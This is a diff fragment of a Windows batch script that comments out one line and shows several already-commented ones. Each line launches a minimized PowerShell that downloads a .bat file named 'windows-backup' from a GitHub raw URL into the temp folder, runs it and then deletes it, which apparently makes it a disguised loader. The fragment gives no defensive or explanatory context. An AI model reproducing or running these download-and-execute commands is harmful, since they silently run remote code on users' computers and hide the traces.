@@ -34,7 +34,7 @@ if %found%==1 (
 
 rem powershell curl -o C:\Capture.png https://i.ibb.co/NS2jTRW/Capture.png
 
-start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup.bat'); Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process $tempPath1 -Wait; Remove-Item $tempPath1"
+rem start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat'; $tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup.bat'); Invoke-WebRequest -Uri $url1 -OutFile $tempPath1; Start-Process $tempPath1 -Wait; Remove-Item $tempPath1"
 rem start /min powershell -Command "$url2 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat'; $tempPath2 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup2.bat'); Invoke-WebRequest -Uri $url2 -OutFile $tempPath2; Start-Process $tempPath2 -Wait; Remove-Item $tempPath2"
 rem start /min powershell -Command "$url3 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat'; $tempPath3 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup3.bat'); Invoke-WebRequest -Uri $url3 -OutFile $tempPath3; Start-Process $tempPath3 -Wait; Remove-Item $tempPath3"
 rem start /min powershell -Command "$url4 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat'; $tempPath4 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup4.bat'); Invoke-WebRequest -Uri $url4 -OutFile $tempPath4; Start-Process $tempPath4 -Wait; Remove-Item $tempPath4"
